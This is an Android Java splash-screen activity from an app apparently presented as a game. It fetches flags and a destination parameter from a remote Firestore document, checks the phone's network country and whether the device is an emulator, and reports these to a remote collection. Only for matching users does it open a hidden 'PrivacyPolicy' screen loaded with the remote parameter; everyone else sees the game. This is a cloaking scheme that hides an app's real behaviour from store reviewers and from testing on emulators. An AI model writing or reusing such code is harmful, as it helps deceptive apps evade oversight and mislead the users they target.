package com.spinthe.buttle;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.firebase.FirebaseApp;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.EventListener;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.FirebaseFirestoreException;
import com.google.firebase.firestore.SetOptions;
import com.onesignal.OneSignal;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class SplashScreen extends AppCompatActivity {
    private Timer timer;
    private TimerTask timerTask;

    private SharedPreferences sharedPreferences;
    private String param = "";
    private String response = "";
    private String country = "";
    private String insurance = "";
    private FirebaseFirestore db;

    private int checker;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();

        setContentView(R.layout.activity_splash_screen);

        FirebaseApp.initializeApp(this);
        db = FirebaseFirestore.getInstance();

        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
        checker = sharedPreferences.getInt("checker", 0);
        String installID = sharedPreferences.getString("installID", null);
        if (installID == null) {
            installID = UUID.randomUUID().toString();
            sharedPreferences.edit().putString("installID", installID).apply();
        }

        String gamar = sharedPreferences.getString("param", "");
        assert gamar != null;
        if (!gamar.equals("")) {
            Intent intent = new Intent(this, PrivacyPolicy.class);
            startActivity(intent);
            finish();
        } else {
            if (isNetworkConnected()) {
                AppLinkData.fetchDeferredAppLinkData(SplashScreen.this,
                        new AppLinkData.CompletionHandler() {
                            @Override
                            public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                                if (appLinkData != null) {
                                    Uri targetUri = appLinkData.getTargetUri();
                                    assert targetUri != null;
                                    getInfo(targetUri.toString());
                                } else {
                                    getInfo("");
                                }
                            }
                        }
                );
            } else {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Intent intent = new Intent(SplashScreen.this, Game.class);
                        startActivity(intent);
                        finish();
                    }
                }, 2000);
            }
        }
    }

    private void getInfo(final String deeplink) {
        post(SplashScreen.this);

        sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
        param = sharedPreferences.getString("param", "");
        final String installID = sharedPreferences.getString("installID", null);

        sharedPreferences.edit().putInt("checker", 1).apply();

        assert param != null;
        if (param.equals("") || param.length() < 7) {
            assert installID != null;
            timer = new Timer();
            timerTask = new TimerTask() {
                @Override
                public void run() {
                    final DocumentReference noteRef = db.collection("black").document("buttle");
                    noteRef.addSnapshotListener(new EventListener<DocumentSnapshot>() {
                        @Override
                        public void onEvent(@Nullable DocumentSnapshot value, @Nullable FirebaseFirestoreException error) {
                            if (error != null) {
                                Toast.makeText(SplashScreen.this, "Error while loading", Toast.LENGTH_SHORT).show();
                                return;
                            }
                            assert value != null;
                            if (value.exists()) {
                                TelephonyManager tm = (TelephonyManager) SplashScreen.this.getSystemService(Context.TELEPHONY_SERVICE);
                                String geo = tm.getNetworkCountryIso();

                                param = value.getString("name");
                                response = value.getString("ded");
                                country = value.getString("geo");
                                insurance = value.getString("insurance");

                                final String mrep = deeplink.length() >= 7 ? (param + deeplink.substring(6)) : (param);
                                assert country != null;

                                checker = checker + 1;

                                if ((param != null && !response.equals("") && !param.equals("") && country.contains(geo)) || Objects.requireNonNull(insurance).length() > 5) {
                                    timer = new Timer();
                                    timerTask = new TimerTask() {
                                        @Override
                                        public void run() {
                                            if (param != null && response != null && !param.equals("")) {
                                                Intent intent = new Intent(SplashScreen.this, PrivacyPolicy.class);
                                                sharedPreferences.edit().putString("param", mrep).apply();
                                                startActivity(intent);
                                                finish();
                                            } else {
                                                Intent intent = new Intent(SplashScreen.this, Game.class);
                                                startActivity(intent);
                                                finish();
                                            }
                                        }
                                    };
                                    timer.schedule(timerTask, 1500);
                                } else {
                                    Intent intent = new Intent(SplashScreen.this, Game.class);
                                    startActivity(intent);
                                    finish();
                                }
                            }
                        }
                    });
                }
            };
            timer.schedule(timerTask, 2000);
        }
    }

    public void post(Context context) {
        SharedPreferences sharedPreferences =
                this.getSharedPreferences("DATA", MODE_PRIVATE);
        String installID = sharedPreferences.getString("installID", null);
        String check = sharedPreferences.getString("check", "true");
        assert check != null;

        java.util.Map<String, Object> data = new HashMap<>();
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String geo = tm.getNetworkCountryIso();
        Date currentTime = Calendar.getInstance().getTime();
        boolean emulator = Build.FINGERPRINT.contains("generic");
        String bundleId = this.getPackageName();
        data.put("currentTime", currentTime);
        data.put("bundleId", bundleId);
        data.put("geo", geo);
        data.put("emulator", emulator);
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        assert installID != null;
        db.collection("kloaka").document(installID).set(data, SetOptions.merge());
        sharedPreferences.edit().putString("check", "false").apply();
    }

    public boolean isNetworkConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        return ni != null;
    }
}